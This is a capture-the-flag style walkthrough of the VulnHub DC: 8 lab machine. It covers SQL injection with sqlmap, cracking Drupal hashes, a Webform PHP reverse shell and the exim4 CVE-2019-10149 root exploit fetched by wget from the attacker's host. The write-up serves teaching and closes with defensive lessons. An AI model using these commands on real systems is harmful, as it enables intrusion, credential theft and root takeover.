# DC: 8 — VulnHub Walkthrough (Beginner Friendly)

> This is a deliberately vulnerable machine for *learning*. Only ever attack a
> box you own or were given written permission to test. Keep it on an isolated
> host-only / NAT lab network that can't reach the internet.

| Field | Value |
| --- | --- |
| **Machine** | DC: 8 |
| **Difficulty** | Intermediate |
| **Author** | DCAU |
| **Released** | 8 Sep 2019 |
| **VulnHub Entry** | [Open on VulnHub](https://vulnhub.com/entry/dc-8,367/) |
| **Download** | [Download OVA](https://vulnhub.com/entry/dc-8,367/#download) |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux (Debian 64-bit) |

> **A note on exact values:** passwords, banner text, IP addresses, and even the
> Drupal version **vary by build**. Every IP here is the example
> `192.168.56.101`. Substitute whatever address `arp-scan` reports for you. The
> *method* is what matters, not the literal strings.

---

## 0. What you will learn

- How to discover a host and its open ports on an isolated lab network.
- How to spot a **SQL injection** in a URL parameter and exploit it with `sqlmap`.
- How to crack Drupal password hashes with **John the Ripper**.
- How a **Webform** in Drupal lets an authenticated user run PHP.
- How to abuse a **SUID `exim4` binary** (CVE-2019-10149) to get root.
- Why "2FA on SSH" doesn't save you when the web app is the way in.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running and be able
to import an OVA.

---

## 1. Reconnaissance — finding the target

> **Goal:** identify the target's IP address on your isolated lab network.

```bash
# See your own address and the lab subnet first
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **How to read it:** your attacker is on `192.168.56.0/24`, so the DC: 8 box
> will be on the same subnet.

```bash
# ARP-scan the subnet to list live hosts (fast, layer 2, ignores firewalls)
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.10   (your Kali)
192.168.56.101  (unknown device)   <-- the target
```

> **Why it works:** ARP resolves "who has this IP?" at the link layer, so it
> finds hosts even if they drop ICMP or block TCP. It's the standard first move.

![finding the target](images/01-recon.png)

**Target IP:** `192.168.56.101` (yours will differ).

---

## 2. Enumeration — open ports and services

```bash
# Full TCP sweep, then detailed service detection
sudo nmap -p- --min-rate 1000 -T4 192.168.56.101
```

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
sudo nmap -sC -sV -p 22,80 192.168.56.101
```

```text
22/tcp open  ssh  OpenSSH 7.4 (protocol 2.0)
80/tcp open  http Apache httpd 2.4.25 (Debian)
|_http-title: Welcome to DC-8
```

> **How to read it:** two ports again — SSH (22) and a web app (80). The web app
> is the interesting surface; SSH is where a *password* might get you in, but
> note the banner — it hints 2FA is configured.

![nmap service scan](images/02-nmap.png)

Browsing the site shows a Drupal 7 CMS. Check for a version leak:

```bash
curl -s http://192.168.56.101/CHANGELOG.txt | head -n 1
```

```text
Drupal 7.67, 2019-08-02
```

> **Why it works:** `CHANGELOG.txt` ships with Drupal 7 and states the exact
> version. Be careful: many public Drupal exploits target *older* versions than
> 7.67, so don't waste time on the wrong one.

If you have `droopescan`, it confirms the modules and version quickly:

```bash
droopescan scan drupal -u http://192.168.56.101
```

```text
[+] Possible version(s):
    7.67
[+] Interesting urls found:
    Default admin - http://192.168.56.101/user/login
```

---

## 3. Foothold — gaining the first shell

### 3.1 Spotting the SQL injection

The navigation links open pages like `http://192.168.56.101/?nid=1`. That
`nid` parameter is a numeric ID passed straight into a SQL query.

```bash
# Add a single quote to the value — if the app is vulnerable you get an error
curl -s "http://192.168.56.101/?nid=1'"
```

```text
... You have an error in your SQL syntax; check the manual that corresponds
to your MariaDB server version ... near '"' at line 1
```

> **Why it works:** an unescaped `'` breaks out of the SQL string, and the raw
> database error is shown to us. That error is the smoking gun for SQL injection.

![enumerating the injection point](images/03-enum.png)

### 3.2 Dumping credentials with sqlmap

`sqlmap` automates the boring parts. Save the request first (or just point it at
the URL).

```bash
sqlmap -u "http://192.168.56.101/?nid=1" --batch --dbs
```

```text
available databases [2]:
[*] d7db
[*] information_schema
```

```bash
# List tables in the Drupal database
sqlmap -u "http://192.168.56.101/?nid=1" -D d7db --tables --batch
```

```text
Database: d7db
[88 tables]
+---------------------------+
| users                     |
| users_roles               |
| ...                       |
+---------------------------+
```

```bash
# Dump the users table (names + password hashes)
sqlmap -u "http://192.168.56.101/?nid=1" -D d7db -T users \
       -C name,pass --dump --batch
```

```text
+-------+---------------------------------------------------------+
| name  | pass                                                    |
+-------+---------------------------------------------------------+
| admin | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z |
| john  | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF |
+-------+---------------------------------------------------------+
```

> **Why it works:** the `users` table is a well-known Drupal table. The
> `$S$` prefix is Drupal 7's salted SHA-512 hash format — strong, but crackable
> if the password is weak.

### 3.3 Cracking the hash with John the Ripper

```bash
echo '$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF' > john.hash
john --wordlist=/usr/share/wordlists/rockyou.txt john.hash
john --show john.hash
```

```text
john:turtle
```

> **Why it works:** `john` tries millions of candidate passwords against the
> salted hash. This one is a dictionary word, so it falls quickly. (The hash and
> even the resulting password **vary by build** if the author changed the seed.)

### 3.4 Log in and get a reverse shell

Log in at `http://192.168.56.101/user/login` as `john` with the cracked
password. DC: 8 ships the **Webform** module, and `john` has permission to edit
the "Contact Us" form's settings — including its **text format**.

Steps:

1. *Content → Webform → Contact Us → Edit → Form settings*.
2. Change the **Text format** to **PHP code**.
3. Insert a PHP reverse shell; set `$ip = '192.168.56.10';` and a port.
4. Start a listener on Kali:

```bash
nc -lvnp 4444
```

5. Submit the "Contact Us" form in the browser to trigger the PHP.

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 55012
www-data@dc-8:/var/www/html$
```

> **Why it works:** this is the same trick as DC-7 — the PHP *input filter*
> allows stored PHP to be executed when the page renders. The difference is that
> here it's reached through the Webform module's "PHP code" format. Remember:
> the *2FA only protects SSH*. The web path never touches it.

Upgrade to a proper TTY:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z, then: stty raw -echo; fg ; then: export TERM=xterm
```

### 3.5 The user flag

DC: 8 only ships **one** flag in `/root`, so there is no user flag — the
escalation below is the finale.

---

## 4. Privilege escalation — becoming root

Start with the standard enumeration checklist:

```bash
sudo -l 2>/dev/null
id
uname -a
find / -perm -4000 -type f 2>/dev/null
```

```text
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/newgrp
/usr/sbin/exim4        <-- unusual
/usr/lib/openssh/ssh-keysign
/bin/su
...
```

> **Why it works:** `exim4` is the mail server (MTA). It should **never** be
> SUID root. Its presence here is the intended escalation path.

Confirm the version:

```bash
/usr/sbin/exim4 --version | head -n 1
```

```text
Exim version 4.89 #1 built ...
```

> **Why it works:** Exim 4.87–4.91 is vulnerable to **CVE-2019-10149** — a
> remote/local command execution bug in the way it handles recipient addresses.
> As a SUID binary, exploiting it hands us root.

Search for the public exploit:

```bash
searchsploit exim 4.89
```

```text
Linux/local/46996.sh | Exim 4.87 - 4.91 - Local Privilege Escalation
```

Transfer it to the target and run it:

```bash
# On Kali
cp /usr/share/exploitdb/exploits/linux/local/46996.sh .
python3 -m http.server 8000
```

```bash
# On the target (www-data), in /tmp
cd /tmp
wget http://192.168.56.10:8000/46996.sh
chmod +x 46996.sh
```

The script needs Unix line endings — if it fails, strip carriage returns first:

```bash
sed -i 's/\r$//' 46996.sh
```

Start a listener and run the exploit in netcat mode (run it fast — the window
closes quickly):

```bash
# On Kali
nc -lvnp 4444
```

```bash
# On the target
./46996.sh -m netcat
```

```text
root@dc-8:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

> **Why it works:** the SUID bit makes the `exim4` process start as root; the
> exploit coaxes it into running our command *as root*, giving us a root shell
> on our listener.

### The root flag

```bash
cd /root
ls
cat flag.txt
```

```text
Congratulations!!!  Hope you enjoyed DC-8.
```

![root flag](images/08-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | SQL injection in the `nid` parameter | `http://target/?nid=1` | Dumped Drupal user hashes |
| 2 | Weak Drupal password hash | `d7db.users` | Cracked to plaintext with John |
| 3 | PHP filter available to a low-priv user | Drupal Webform module | Reverse shell as `www-data` |
| 4 | SUID `exim4` binary (CVE-2019-10149) | `/usr/sbin/exim4` v4.89 | Local root code execution |

## 6. Defensive lessons (blue team)

- **Use parameterised queries / prepared statements.** Never concatenate user
  input into SQL — that alone kills the initial foothold.
- **Store passwords with a modern, slow hash** (bcrypt/Argon2). Drupal's `$S$`
  hash is strong only if the password is strong *and* unique.
- **Restrict PHP execution.** Disable the PHP filter/format for all but
  super-admins, or remove it entirely; enforce least privilege on content roles.
- **Never set SUID on a mail server.** Remove the SUID bit from `exim4` and
  patch it — 2FA on SSH is useless if the web app or a SUID binary is the
  entry point.
- **Detect it:** watch for `exim4` spawning shells, unexpected outbound
  connections from the mail process, and `wget`/downloads into `/tmp`.

---

## 7. References

- VulnHub entry: <https://vulnhub.com/entry/dc-8,367/>
- Community writeups consulted:
  - [mzfr — VulnHub DC-8 writeup](https://blog.mzfr.me/vulnhub-writeups/2019-09-5-DC8)
  - [Hacking Articles — DC8 Vulnhub Walkthrough](https://www.hackingarticles.in/dc8-vulnhub-walkthrough/)
  - [MkS — VulnHub DC: 8 Write-up](https://mks.tw/3361/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8-vulnhub-dc-8-write-up)
  - [Bl4nk_5h3ll — DC-8 Vulnhub Machine](https://soufian2017.github.io/Blog/posts/DC-8-Vulnhub/)
- Advisories / tool docs:
  - [CVE-2019-10149 (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)
  - [Exploit-DB 46996](https://www.exploit-db.com/exploits/46996)
  - [sqlmap documentation](https://sqlmap.org/)
  - [John the Ripper](https://www.openwall.com/john/)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target with arp-scan
- [ ] `images/02-nmap.png` — port/service scan of 22 and 80
- [ ] `images/03-enum.png` — the `nid` SQL error / sqlmap dumping `d7db`
- [ ] `images/04-foothold.png` — John the Ripper cracking `john`'s hash
- [ ] `images/05-shell.png` — reverse shell as `www-data`
- [ ] `images/06-webshell.png` — editing the Webform to PHP code
- [ ] `images/07-privesc.png` — SUID `exim4` / running exploit 46996
- [ ] `images/08-root-flag.png` — the root flag

---

_Part of the [Cybersecurity101-Labs](../../README.md) collection. See the complete [catalog](../../docs/CATALOG.md)._
